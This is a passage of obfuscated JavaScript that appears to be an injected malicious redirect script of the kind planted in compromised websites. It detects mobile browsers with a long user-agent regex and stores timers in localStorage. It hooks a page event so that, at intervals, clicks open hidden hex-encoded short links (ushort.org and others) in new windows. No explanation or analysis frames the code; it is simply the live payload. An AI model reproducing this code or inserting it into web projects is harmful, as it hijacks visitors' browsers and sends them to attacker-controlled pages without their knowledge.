)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());